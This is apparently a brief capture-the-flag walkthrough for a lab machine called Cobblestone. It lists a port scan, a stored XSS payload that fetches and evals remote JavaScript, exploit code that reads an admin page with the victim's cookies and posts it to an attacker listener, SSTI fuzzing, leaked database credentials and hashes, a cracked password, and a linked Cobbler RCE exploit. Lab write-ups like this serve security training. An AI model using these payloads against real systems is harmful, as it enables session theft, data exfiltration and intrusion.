```┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV cobblestone.htb     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-14 17:29 EDT
Nmap scan report for cobblestone.htb (10.129.232.170)
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Cobblestone - Official Website
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds

```

Confirm SSRF using 
```──(kali㉿kali)-[~/Downloads/CTF/Cobblestone]
└─$ python3 -m http.server                                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.232.170 - - [16/Aug/2026 00:59:10] "GET / HTTP/1.1" 200 -
10.129.232.170 - - [16/Aug/2026 00:59:10] code 404, message File not found
10.129.232.170 - - [16/Aug/2026 00:59:10] "GET /favicon.ico HTTP/1.1" 404 -
10.129.232.170 - - [16/Aug/2026 00:59:16] "GET / HTTP/1.1" 200 -
10.129.232.170 - - [16/Aug/2026 00:59:21] "GET / HTTP/1.1" 200 -

```

Now create exploit.js 

fetch('http://10.10.16.247:9000', {method: 'POST', mode: 'no-cors', body:document.documentElement.outerHTML})

```
fetch('http://10.10.16.247:9000', {method: 'POST', mode: 'no-cors', body:document.documentElement.outerHTML})

```
Now serve exploit.js on port 8000 and create netcat listener on port 9000

Then use this request to fetch & Eval the exploit:

<img/src/x/onerror="fetch('http://10.10.16.247:8000/exploit.js').then(a=>a.text()).then(eval)">

```
<img/src/x/onerror="fetch('http://10.10.16.247:8000/exploit.js').then(a=>a.text()).then(eval)">
```

Save contents to page.html and host it and view it locally, it should reveal endpoint
/skins_app_admin_server_info.php

navigate there on the main page search by cookie

change exploit.js to 

fetch('http://cobblestone.htb/skins_app_admin_server_info.php', {
    credentials: 'include'
})
.then(r => r.text())
.then(q => fetch('http://10.10.16.247:9000', {
    method: 'POST',
    mode: 'no-cors',
    body: q
}));



```
fetch('http://cobblestone.htb/skins_app_admin_server_info.php', {
    credentials: 'include'
})
.then(r => r.text())
.then(q => fetch('http://10.10.16.247:9000', {
    method: 'POST',
    mode: 'no-cors',
    body: q
}));

```

Now save output back to page.html and view it to steal the cookie, ALSO enumerate apparmor as a plugin

resave to page.html and steal php cookie: 7e8mb7gevguljgmaho2ke3ogja

confirm ssrf in the first name field of user {{7 * 7}}

open in burp and use https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz

to fuzz the ssti then enumerate /db/connection.php

```
<?php
$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";
```

now enumerate /etc/apparmor.d/apache2.d/cobblestone and find allowed executable /usr/bin/mysqldump -udbuser -p<pass> cobblestone

INSERT INTO `users` VALUES
(1,'admin','admin','admin','admin@cobblestone.htb','admin','f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1','*'),
(2,'cobble','cobble','stone','cobble@cobblestone.htb','admin','20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d','*'),
(3,'test','test','test','test@example.com','user','9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08','10.10.16.247');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

take sha256 hashes and crack using hashcat mode 1400 password should be iluvdannymorethanyouknow for user cobble

enumerate services and grep with ps aux and then forward port:

ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb

Then use this CVE for root: https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC



